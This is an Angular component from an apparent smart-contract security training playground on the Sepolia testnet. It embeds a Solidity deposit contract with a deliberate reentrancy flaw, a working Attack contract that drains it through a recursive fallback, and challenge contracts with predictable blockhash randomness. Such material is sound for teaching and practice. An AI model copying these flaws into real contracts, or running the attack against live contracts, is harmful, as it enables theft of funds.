import { Component, OnInit, ChangeDetectorRef } from "@angular/core";
import { KeysService } from "../Services/keys.service";
import { SnackBarHelperService } from "../Services/snack-bar-helper.service";
import {
  BeeFaucetABI,
  BeeTokenABI,
  nftABI,
} from "../../assets/public/ContractABIs";
import { getDefaultProvider, ethers, BigNumber } from "ethers";
import {
  createClient,
  connect,
  disconnect,
  getAccount,
  signMessage,
  InjectedConnector,
} from "@wagmi/core";
import {
  solidityCompiler,
  getCompilerVersions,
} from "@agnostico/browser-solidity-compiler";

const client = createClient({
  autoConnect: true,
  provider: getDefaultProvider(),
});
const { ethereum } = window;
const depositFundsAddress = "0xEAF07267323bd4114E1f1e059e8A6445f6Ad190C";
const attackAddress = "0xEAF07267323bd4114E1f1e059e8A6445f6Ad190C";
const attackABI = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    stateMutability: "payable",
    type: "fallback",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "depositFunds",
    outputs: [
      {
        internalType: "contract DepositFunds",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
];
const vulnerableAddress = "0xEAF07267323bd4114E1f1e059e8A6445f6Ad190C";
const vulnerableABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    name: "balances",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "deposit",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "withdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

@Component({
  selector: "app-contract-playground",
  templateUrl: "./contract-playground.component.html",
  styleUrls: ["./contract-playground.component.scss"],
})
export class ContractPlaygroundComponent {
  constructor(
    private readonly keysService: KeysService,
    private readonly snackBarHelperService: SnackBarHelperService,
    private readonly changeDetectorRef: ChangeDetectorRef
  ) {}
  ngOnInit(): void {
    this.handleAuth();
    window.ethereum.on("chainChanged", this.handleChainChanged.bind(this));
  }
  userData: object;
  session = false;
  deployedContractAddress = "";
  metamaskAddress = "";

  vulnerableContract: string = `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

}
`;
  code: string = `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract DepositFunds {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }
}
contract Attack {
    DepositFunds public depositFunds;
    address deployedContract = 0xEAF07267323bd4114E1f1e059e8A6445f6Ad190C;
    constructor() {
        depositFunds = DepositFunds(deployedContract);
    }
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether);
        depositFunds.deposit{value: 0.1 ether}();
        depositFunds.withdraw();
    }
    receive() external payable {
    }

}
`;
  randomNumberContract: string = `contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}`;
  randomNewNumberContract: string = `contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}`;
  editorOptions = {
    mode: "text/x-solidity",
    theme: "dracula",
    lineNumbers: true,
    lineWrapping: true,
  };
  editorDisabledOptions = {
    mode: "text/x-solidity",
    theme: "material",
    lineNumbers: true,
    lineWrapping: true,
    readOnly: "nocursor",
  };

  async compileAndDeployCode(code: string) {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      console.log(provider);
      console.log(signer);
      const output: any = await solidityCompiler({
        version: `https://binaries.soliditylang.org/bin/soljson-v0.6.0+commit.26b70077.js`,
        contractBody: code,
      });

      console.log("output", output);
      const contractBytecode =
        output?.contracts["Compiled_Contracts"]["AttackerContract"].evm.bytecode
          .object;
      const contractAbi =
        output?.contracts["Compiled_Contracts"]["AttackerContract"].abi;

      const factory = new ethers.ContractFactory(
        contractAbi,
        contractBytecode,
        signer
      );
      const contract = await factory.deploy();

      await contract.deployed();

      console.log("Contract deployed:", contract.address);
      this.deployedContractAddress = contract.address;
      console.log(this.deployedContractAddress);
    } catch (error) {
      console.error("Error compiling/deploying contract:", error);
    }
  }
  async handleChainChanged(chainId: string) {
    await this.handleAuth();
  }
  async transferEthToContract() {
    // Connect to the Ethereum network using the default provider
    const provider = ethers.getDefaultProvider();

    try {
      // Create a new wallet using the private key
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      // Create a new instance of the smart contract
      const contract = new ethers.Contract(
        vulnerableAddress,
        vulnerableABI,
        signer
      );

      // Set the amount to transfer (0.1 ETH)
      const amount = ethers.utils.parseEther("0.1");

      // Call the receiveMoney function on the smart contract
      const transaction = await contract.deposit({ value: amount });

      // Wait for the transaction to be mined
      await transaction.wait();

      console.log("ETH transferred successfully to the smart contract wallet.");
    } catch (error) {
      console.error(
        "Failed to transfer ETH to the smart contract wallet:",
        error
      );
    }
  }
  async handleAuth() {
    try {
      const { isConnected } = getAccount();

      if (isConnected) {
        await disconnect();
      }
      if (!window.ethereum) {
        this.snackBarHelperService.open(
          "Please install a Web3 Wallet like Metamask to proceed.",
          "errorBar"
        );
        return;
      }

      const provider = await connect({ connector: new InjectedConnector() });
      this.metamaskAddress = provider.account;
      this.userData = {
        address: provider.account,
        chain: provider.chain.id,
        network: "evm",
      };
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0xaa36a7",
            chainName: "Sepolia Test Network",
            nativeCurrency: {
              name: "SepoliaETH",
              symbol: "ETH",
              decimals: 18,
            },
            rpcUrls: ["https://ethereum-sepolia.blockpi.network/v1/rpc/public"],
            blockExplorerUrls: ["https://sepolia.etherscan.io/"],
          },
        ],
      });
      const targetChainId = "11155111";
      const currentChainId = String(provider.chain?.id);

      if (provider && currentChainId !== targetChainId) {
        this.session = false;
        this.snackBarHelperService.open(
          "Please connect to the Sepolia Network",
          "errorBar"
        );
      } else {
        console.log("Should show ethereum chain now");
        this.session = true;
      }
      console.log("session", this.session);
      this.changeDetectorRef.detectChanges();
    } catch (err) {
      console.log("An error occured");
    }
  }
}
